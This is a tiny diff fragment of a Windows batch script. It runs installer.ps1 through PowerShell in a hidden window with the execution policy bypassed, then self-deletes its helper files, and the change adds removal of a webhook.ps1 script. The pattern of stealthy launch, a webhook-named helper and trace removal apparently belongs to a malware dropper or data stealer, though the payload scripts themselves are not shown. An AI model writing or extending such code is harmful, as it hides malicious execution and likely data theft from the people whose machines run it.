@@ -41,4 +41,5 @@ powershell -windowstyle hidden -ep bypass ./installer.ps1
 
 REM self delete
 del installer.ps1
+del webhook.ps1
 del wget.cmd
